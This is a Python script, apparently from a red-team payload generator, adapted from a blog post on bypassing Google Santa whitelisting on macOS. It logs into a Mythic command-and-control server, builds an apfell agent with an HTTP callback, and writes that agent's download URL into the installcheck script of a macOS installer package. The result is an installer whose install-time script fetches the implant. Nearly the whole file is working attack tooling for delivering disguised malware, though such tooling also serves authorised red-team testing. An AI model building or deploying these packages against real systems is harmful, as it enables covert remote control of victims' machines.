# Adapted from https://www.praetorian.com/blog/bypassing-google-santa-application-whitelisting-on-macos-part-2/

import shutil, errno, os
from mythic import *
from sys import exit
from os import system
from Settings.MythicSettings import *

def install_js_script():
    temp = "./Templates/Installer_Package_JS_Script/"
    payload = "./Payloads/Installer_Package_JS_Script_Payload" 

    def copyanything(src, dst):
        try:
            shutil.copytree(src, dst)
            print("[+] Copied Template Folder to '% s'" % payload)
        except OSError as error:
        	shutil.rmtree(dst)
        	shutil.copytree(src, dst)
        	print("[+] Overwrote files '%s'" % payload)

    copyanything(temp,payload)    

    ## Create apfell payload
    async def scripting():
        mythic = Mythic(
            username=mythic_username,
            password=mythic_password,
            server_ip=mythic_server_ip,
            server_port=mythic_server_port,
            ssl=mythic_ssl,
            global_timeout=-1,
        )
        print("[+] Logging into Mythic")
        await mythic.login()
        await mythic.set_or_create_apitoken()
        # define what our payload should be
        p = Payload(
            payload_type="apfell", 
            c2_profiles={
                "HTTP":[
                        {"name": "callback_host", "value": mythic_http_callback_host},
                        {"name": "callback_interval", "value": mythic_http_callback_interval}
                    ]
                },
            tag="Installer Pkg with JS Functionality calls Script",
            # if we want to only include specific commands, put them here:
            #commands=["cmd1", "cmd2", "cmd3"],
            filename="Installer_with_JavaScript_Script.js")
        print("[+] Creating new apfell payload")
        # create the payload and include all commands
        # if we define commands in the payload definition, then remove the all_commands=True piece
        resp = await mythic.create_payload(p, all_commands=True, wait_for_build=True)

        print("[*] Building Installer Package JS Script Payload")
        payloadDownloadid = resp.response.file_id.agent_file_id
  
        #Reaplace template values
        templateString = "templatescript"
        fin = open(payload + "/distribution.xml", "rt")
        data = fin.read()
        data = data.replace(templateString, "installcheck") #the filename can be anything
        fin.close()
        fin = open(payload + "/distribution.xml", "wt")
        fin.write(data)
        fin.close()

        templateString = "URL"
        modifyFile = payload + "/Scripts/installcheck"
        url = "https://" + mythic_server_ip + ":" + mythic_server_port + "/api/v1.4/files/download/" + payloadDownloadid # modify to point to desired location

        fin = open(modifyFile, "rt")
        data = fin.read()
        data = data.replace(templateString, url)
        fin.close()
        fin = open(payload + "/Scripts/installcheck", "wt")
        fin.write(data)
        fin.close()

        os.system("chmod +x " + payload + "/Scripts/installcheck")
        os.system("pkgbuild --identifier simple.test --nopayload " + payload + "/install.pkg")
        os.system("productbuild --distribution " + payload + "/distribution.xml " + "--scripts " + payload + "/Scripts " + "--package-path " + payload + "/install.pkg " + payload+ "/JSpackageScript.pkg")

        print("[+] Built Installer Package Payload w/ JavaScript as JSpackage.pkg")

    async def main():
        await scripting()
        try:
            while True:
                pending = asyncio.all_tasks()
                plist = []
                for p in pending:
                    if p._coro.__name__ != "main" and p._state == "PENDING":
                        plist.append(p)
                if len(plist) == 0:
                    exit(0)
                else:
                    await asyncio.gather(*plist)
        except KeyboardInterrupt:
            pending = asyncio.all_tasks()
            for t in pending:
                t.cancel()    

    loop = asyncio.get_event_loop()
    loop.run_until_complete(main())
